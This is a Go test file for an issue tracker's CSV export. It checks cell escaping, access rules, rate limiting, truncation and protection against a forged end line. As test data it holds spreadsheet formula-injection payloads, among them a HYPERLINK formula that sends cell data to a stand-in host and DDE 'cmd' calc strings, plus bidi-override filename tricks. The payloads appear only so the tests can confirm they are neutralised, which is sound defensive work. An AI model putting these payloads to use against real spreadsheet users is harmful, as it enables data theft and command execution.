package api

import (
	"bytes"
	"encoding/csv"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"
	"unicode"
	"unicode/utf8"

	"github.com/aupv9/warden/backend/internal/service"
	"github.com/aupv9/warden/backend/internal/service/servicetest"
)

// r builds a string from runes, so invisible characters stay readable here.
func r(rs ...rune) string { return string(rs) }

const (
	rlo  = 0x202E // right-to-left override
	lri  = 0x2066
	pdi  = 0x2069
	zwsp = 0x200B
	bom  = 0xFEFF
	fwEq = 0xFF1D // fullwidth =
	nel  = 0x85   // C1 next line
	lsep = 0x2028
)

func TestCSVCellEscaping(t *testing.T) {
	for _, c := range []struct{ in, want string }{
		// Formulas from scanned code.
		{`=HYPERLINK("http://evil.test/?d="&A1,"Click")`, `'=HYPERLINK("http://evil.test/?d="&A1,"Click")`},
		{`+cmd|' /C calc'!A0`, `'+cmd|' /C calc'!A0`},
		{`-2+3`, `'-2+3`},
		{`@SUM(1+1)*cmd|' /C calc'!A0`, `'@SUM(1+1)*cmd|' /C calc'!A0`},
		{"\t=1+1", "' =1+1"},
		{"\r=1+1", "' =1+1"},
		{"\r\n-1", "'  -1"},
		{"   =1", "'   =1"},
		{r(bom) + "=1", "'=1"},
		{r(zwsp) + "@x", "'" + r(zwsp) + "@x"},
		{r(fwEq) + "1+1", "'" + r(fwEq) + "1+1"},
		{r(rlo) + "=1", "'=1"},
		// Control characters: NUL dropped, the rest (and line separators) a space.
		{"a\nb\r\nc", "a b  c"},
		{"x\x00y", "xy"},
		{"bell\x07 del\x7f nel" + r(nel) + "sep" + r(lsep) + "end", "bell  del  nel sep end"},
		// Bidi controls dropped: no Trojan Source reordering in a viewer.
		{"invoice" + r(rlo) + "gpj.exe", "invoicegpj.exe"},
		{"a" + r(lri) + "b" + r(pdi) + "c", "abc"},
		// Invalid UTF-8.
		{"\xff=1", r(utf8.RuneError) + "=1"},
		// Left alone.
		{"", ""},
		{"SQL injection in db.py", "SQL injection in db.py"},
		{"1-2", "1-2"},
		{"a=b", "a=b"},
		{"'=already text", "'=already text"},
		{`say "hi", then, leave`, `say "hi", then, leave`},
		{"2026-10-26T12:00:00Z", "2026-10-26T12:00:00Z"},
		{"日本語のタイトル", "日本語のタイトル"},
	} {
		if got := csvCell(c.in); got != c.want {
			t.Errorf("csvCell(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// Quotes, commas and newlines survive a round trip through encoding/csv, and
// every record is one line.
func TestCSVCellRoundTrip(t *testing.T) {
	cells := []string{`a "quoted", title`, "multi\nline\r\ntitle", `"`, `,`, "=1,2"}
	var buf bytes.Buffer
	w := csv.NewWriter(&buf)
	w.UseCRLF = true
	rec := make([]string, len(cells))
	for k, c := range cells {
		rec[k] = csvCell(c)
	}
	_ = w.Write(rec)
	w.Flush()
	if strings.Count(buf.String(), "\n") != 1 {
		t.Fatalf("record spans lines: %q", buf.String())
	}
	back, err := csv.NewReader(&buf).Read()
	if err != nil || !slices.Equal(back, []string{`a "quoted", title`, "multi line  title", `"`, `,`, "'=1,2"}) {
		t.Fatal(back, err)
	}
}

func FuzzCSVCell(f *testing.F) {
	for _, s := range []string{"=1", " +x", "\t@", "-", r(bom) + "=", r(rlo) + "+", "a\x00b", "\xff\xfe", "ok", r(zwsp, ' ', fwEq)} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, in string) {
		out := csvCell(in)
		if !utf8.ValidString(out) {
			t.Fatalf("invalid UTF-8: %q", out)
		}
		for _, c := range out {
			if c < 0x20 || (c >= 0x7f && c < 0xa0) || c == lsep || c == 0x2029 || c == bom || isBidiControl(c) {
				t.Fatalf("%q kept %U", out, c)
			}
		}
		// The first visible character never starts a formula, unless the
		// apostrophe is in front.
		if !strings.HasPrefix(out, "'") {
			for _, c := range out {
				if unicode.IsSpace(c) || unicode.Is(unicode.Cf, c) {
					continue
				}
				if formulaStart(c) {
					t.Fatalf("%q starts a formula", out)
				}
				break
			}
		}
		if again := csvCell(out); again != out {
			t.Fatalf("not idempotent: %q -> %q", out, again)
		}
		// Plain text is left as it is.
		if !strings.ContainsFunc(in, func(c rune) bool { return !unicode.IsLetter(c) && !unicode.IsDigit(c) && c != ' ' && c != '.' }) &&
			out != in && utf8.ValidString(in) {
			t.Fatalf("plain %q changed to %q", in, out)
		}
	})
}

// export requests the CSV as email.
func (e *env) export(query, email string) *httptest.ResponseRecorder {
	e.t.Helper()
	req := httptest.NewRequest("GET", "/api/v1/orgs/"+e.org.String()+"/issues/export.csv"+query, nil)
	req.Header.Set("Authorization", "Bearer "+e.tokenFor(email, nil))
	w := httptest.NewRecorder()
	e.h.ServeHTTP(w, req)
	return w
}

// readCSV returns a complete export's data rows: after the header, and before
// the end line, which must count them.
func readCSV(t *testing.T, w *httptest.ResponseRecorder) [][]string {
	t.Helper()
	if w.Code != 200 {
		t.Fatalf("%d: %s", w.Code, w.Body)
	}
	cr := csv.NewReader(bytes.NewReader(w.Body.Bytes()))
	cr.FieldsPerRecord = -1
	recs, err := cr.ReadAll()
	if err != nil || len(recs) < 2 || !slices.Equal(recs[0], exportColumns) {
		t.Fatal(recs, err)
	}
	data := recs[1 : len(recs)-1]
	end := "#warden:end rows=" + strconv.Itoa(len(data))
	if !slices.Equal(recs[len(recs)-1], []string{end}) || !strings.HasSuffix(w.Body.String(), "\r\n"+end+"\r\n") {
		t.Fatalf("no end line %q: %q", end, recs[len(recs)-1])
	}
	for _, row := range data {
		if len(row) != len(exportColumns) {
			t.Fatalf("%q", row)
		}
	}
	return data
}

func TestExportIssuesCSV(t *testing.T) {
	e := newEnv(t)
	devID := e.u[dev]
	due := e.f.Now.Add(48 * time.Hour)
	hostile := e.f.AddIssue(e.web, "critical", "open", &devID)
	e.f.SetIssue(hostile, func(i *servicetest.IssueRow) {
		i.Title = `=HYPERLINK("http://evil.test","x")` + "\n" + r(rlo) + "fdp.exe"
		fp := `src/"a",b.go`
		i.FilePath, i.CVE, i.DueAt, i.Tool, i.RuleID = &fp, []string{"CVE-2024-0001", "CVE-2024-0002"}, &due, "trivy", "-1+cmd"
	})
	e.f.AddIssue(e.web, "low", "in_progress", nil)
	e.f.AddIssue(e.web, "high", "fixed", nil) // not active: not in the default list
	e.f.AddIssue(e.api, "high", "open", nil)  // dev isn't in API

	w := e.export("", dev)
	h := w.Header()
	if h.Get("Content-Type") != "text/csv; charset=utf-8" || h.Get("Cache-Control") != "no-store" ||
		h.Get("Content-Disposition") != `attachment; filename="warden-issues-`+e.org.String()+`-2026-10-26.csv"` ||
		h.Get("X-Warden-Truncated") != "" || h.Get("X-Content-Type-Options") != "nosniff" {
		t.Fatal(h)
	}
	rows := readCSV(t, w)
	if len(rows) != 2 {
		t.Fatal(rows)
	}
	var got []string
	for _, row := range rows {
		if row[0] == "WEB-1" {
			got = row
		}
	}
	want := []string{"WEB-1", "WEB", `'=HYPERLINK("http://evil.test","x") fdp.exe`, "critical", "open", "trivy", "'-1+cmd",
		`src/"a",b.go`, "", "", "CVE-2024-0001 CVE-2024-0002", "false", "", dev, due.Format(time.RFC3339)}
	if len(got) != len(exportColumns) || !slices.Equal(got[:len(want)], want) || got[16] == "" {
		t.Fatalf("%q", got)
	}
	// Nothing but the fixed columns: no description, snippet or comment column.
	// Header, two rows and the end line, exactly that last.
	if strings.Contains(w.Body.String(), "\x00") || bytes.Count(w.Body.Bytes(), []byte("\r\n")) != 4 ||
		!strings.HasSuffix(w.Body.String(), "\r\n#warden:end rows=2\r\n") {
		t.Fatalf("%q", w.Body.String())
	}
	// Nothing to count: still the header and the end line.
	if w := e.export("", outsider); w.Body.String() != strings.Join(exportColumns, ",")+"\r\n#warden:end rows=0\r\n" {
		t.Fatalf("%q", w.Body.String())
	}

	// The list's visibility and filters, in the list's order.
	if rows := readCSV(t, e.export("", lead)); len(rows) != 3 {
		t.Fatal(rows)
	}
	if rows := readCSV(t, e.export("?status=fixed,open&severity=high", lead)); len(rows) != 2 {
		t.Fatal(rows)
	}
	if rows := readCSV(t, e.export("", outsider)); len(rows) != 0 {
		t.Fatal(rows)
	}
	list := e.do("GET", "/issues?sort=-severity&status=open,in_progress,fixed", lead, nil)
	rows = readCSV(t, e.export("?sort=-severity&status=open,in_progress,fixed", lead))
	if len(rows) != len(list.items()) {
		t.Fatal(rows, list.body)
	}
	for k, it := range list.items() {
		if rows[k][0] != it.(map[string]any)["key"] {
			t.Fatal(k, rows[k], list.body)
		}
	}

	// Recorded: who, the filters and the row count, never the rows.
	var entry map[string]any
	for _, a := range e.f.AuditLog() {
		if a.Action == "issues.exported" && *a.ActorID == devID {
			entry = a.Data
		}
	}
	if entry == nil || entry["rows"] != 2 || entry["truncated"] != false || entry["sort"] != "due_at" {
		t.Fatalf("%+v", entry)
	}
	if raw, _ := json.Marshal(e.f.AuditLog()); strings.Contains(string(raw), "HYPERLINK") {
		t.Fatal("rows in the audit log")
	}
	n := len(e.f.AuditLog())

	// Refusals: same validation as the list, a JSON error and no CSV, nothing recorded.
	for _, q := range []string{"?status=bogus", "?sort=title", "?epss_min=2", "?project_id=x", "?q=" + strings.Repeat("a", 201), "?target=UPPER"} {
		w := e.export(q, lead)
		if w.Code != 422 || !strings.HasPrefix(w.Header().Get("Content-Type"), "application/json") || w.Header().Get("Content-Disposition") != "" {
			t.Fatal(q, w.Code, w.Header(), w.Body)
		}
	}
	if w := e.export("", stranger); w.Code != 404 {
		t.Fatal(w.Code, w.Body)
	}
	_, tok := e.newToken(owner, e.web, "issues:read", "scan:write")
	if r := e.doTok("GET", "/issues/export.csv", tok, nil); r.code != 403 || r.code_() != "TOKEN_SCOPE" {
		t.Fatal(r.body)
	}
	// Bulk export is for people: the token allow-list must never gain it
	// (GET /issues/:issue_id, which tokens may call, doesn't match it).
	for route := range tokenRoutes {
		if strings.Contains(route, "export") || strings.Contains(route, "audit-log") {
			t.Fatal("token route:", route)
		}
	}
	if len(e.f.AuditLog()) != n+1 { // the token's creation only
		t.Fatal(e.f.AuditLog()[n:])
	}
}

func TestExportIssuesTruncated(t *testing.T) {
	e := newEnv(t)
	e.f.AddIssues(e.web, 50001, "low", "open")
	w := e.export("", lead)
	if w.Header().Get("X-Warden-Truncated") != "true" {
		t.Fatal(w.Header())
	}
	// Truncated is still complete: the end line counts the rows sent.
	if rows := readCSV(t, w); len(rows) != 50000 || !strings.HasSuffix(w.Body.String(), "\r\n#warden:end rows=50000\r\n") {
		t.Fatal(len(rows))
	}
	a := e.f.AuditLog()
	if d := a[len(a)-1].Data; d["rows"] != 50000 || d["truncated"] != true {
		t.Fatalf("%+v", d)
	}
}

func TestExportIssuesRateLimit(t *testing.T) {
	e := newEnv(t)
	for range 30 {
		if w := e.export("", dev); w.Code != 200 {
			t.Fatal(w.Code, w.Body)
		}
		e.f.Now = e.f.Now.Add(time.Minute)
	}
	w := e.export("", dev)
	if w.Code != 429 || w.Header().Get("Retry-After") != "1800" { // the first was 30 minutes ago
		t.Fatal(w.Code, w.Header(), w.Body)
	}
	// Per user: the lead may still export.
	if w := e.export("", lead); w.Code != 200 {
		t.Fatal(w.Code, w.Body)
	}
	e.f.Now = e.f.Now.Add(30 * time.Minute)
	if w := e.export("", dev); w.Code != 200 {
		t.Fatal(w.Code, w.Body)
	}
}

// A failure before the CSV starts is an ordinary JSON error; one halfway
// through cuts the connection, so the client can't mistake a short file for
// the whole list.
func TestExportIssuesFailures(t *testing.T) {
	e := newEnv(t)
	e.f.AddIssues(e.web, 3, "low", "open")
	e.f.Fail["CountIssues"] = errors.New(`ERROR: relation "issue" permission denied`)
	w := e.export("", lead)
	if w.Code != 500 || w.Header().Get("Content-Disposition") != "" || strings.Contains(w.Body.String(), "relation") {
		t.Fatal(w.Code, w.Header(), w.Body)
	}
	for _, a := range e.f.AuditLog() {
		if a.Action == "issues.exported" {
			t.Fatal("recorded an export that didn't happen")
		}
	}
	delete(e.f.Fail, "CountIssues")

	// The stream fails before its buffer was ever sent: still a JSON error.
	e.f.Fail["ExportIssues"] = errors.New("connection reset")
	if w := e.export("", lead); w.Code != 500 || w.Header().Get("Content-Disposition") != "" {
		t.Fatal(w.Code, w.Header(), w.Body)
	}

	// Halfway, after 1000 rows were sent: the connection is cut.
	e.f.AddIssues(e.web, 1500, "low", "open")
	srv := httptest.NewServer(e.h)
	defer srv.Close()
	req, _ := http.NewRequest("GET", srv.URL+"/api/v1/orgs/"+e.org.String()+"/issues/export.csv", nil)
	req.Header.Set("Authorization", "Bearer "+e.tokenFor(lead, nil))
	res, err := srv.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()
	body, err := io.ReadAll(res.Body)
	if err == nil || strings.Contains(string(body), `"error"`) || strings.Contains(string(body), "#warden:end") {
		t.Fatalf("read %q without an error (%v)", body, err)
	}

	// Where the connection can't be cut (HTTP/2; here a recorder) the
	// response just ends, with rows but without the end line.
	w = e.export("", lead)
	if w.Code != 200 || bytes.Count(w.Body.Bytes(), []byte("\r\n")) < 500 || strings.Contains(w.Body.String(), "#warden:end") {
		t.Fatalf("%d %d %q", w.Code, bytes.Count(w.Body.Bytes(), []byte("\r\n")), w.Body.String()[max(0, w.Body.Len()-200):])
	}
}

// The end line can't come from data: every data row has all the columns, the
// key is the server's, and a cell can't break its row.
func TestExportEndLineCantBeForged(t *testing.T) {
	end := exportEndLine(1)
	fp := end + "\r\n" + end
	hostile := service.IssueExportRow{Key: end, ProjectName: end, Title: "\n" + end, Severity: end, Status: end, Tool: end,
		RuleID: end + "\n", FilePath: &fp, Target: end}
	var buf bytes.Buffer
	cw := csv.NewWriter(&buf)
	cw.UseCRLF = true
	_ = cw.Write(exportRecord(hostile))
	cw.Flush()
	for _, line := range strings.Split(buf.String(), "\r\n") {
		if strings.HasPrefix(line, "#warden:end") || strings.HasPrefix(line, `"#warden:end`) || strings.TrimSpace(line) == end {
			t.Fatalf("%q", buf.String())
		}
	}
	if rec := exportRecord(hostile); rec[0] != "'"+end {
		t.Fatal(rec[0])
	}

	// Keys are the project's key and a number: a project key can't start with "#".
	e := newEnv(t)
	for _, key := range []string{"#WARDEN", "#warden:end rows=1", "'#W"} {
		r := e.do("POST", "/projects", lead, map[string]any{"key": key, "name": "x"})
		e.expect(r, 422, "VALIDATION_FAILED")
		if _, ok := r.Error.Metadata["fields"].(map[string]any)["key"]; !ok {
			t.Fatal(key, r.body)
		}
	}
	e.f.AddIssues(e.web, 3, "low", "open")
	for _, row := range readCSV(t, e.export("", lead)) {
		if !regexp.MustCompile(`^[A-Z][A-Z0-9]{1,9}-[1-9][0-9]*$`).MatchString(row[0]) {
			t.Fatal(row[0])
		}
	}
}
